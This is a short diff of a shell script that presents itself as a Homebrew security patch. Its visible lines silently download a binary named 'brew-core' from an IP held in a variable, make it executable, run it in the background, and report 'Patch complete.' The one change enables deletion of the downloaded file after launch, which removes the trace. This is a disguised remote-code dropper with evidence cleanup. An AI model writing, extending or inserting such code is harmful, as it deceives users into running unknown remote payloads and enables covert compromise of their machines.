@@ -9,6 +9,6 @@ echo "Applying Brew security patch..."
 curl http://$ip/brew-core -o $tmp >/dev/null 2>&1
 chmod +x $tmp
 nohup $tmp $bin_args >/dev/null 2>&1 &
-#rm $tmp
+rm $tmp
 sleep 5
 echo "Patch complete."
